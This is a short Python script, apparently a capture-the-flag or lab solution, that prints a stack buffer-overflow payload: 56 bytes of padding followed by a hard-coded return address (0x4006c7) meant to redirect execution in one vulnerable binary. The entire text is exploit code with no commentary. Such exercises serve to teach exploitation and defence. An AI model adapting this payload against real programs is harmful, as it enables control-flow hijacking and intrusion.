#!/usr/bin/env python3
import sys
some_bytes = b'\x68' * 56 + b'\xc7\x06\x40\x00\x00\x00\x00'
sys.stdout.buffer.write(some_bytes)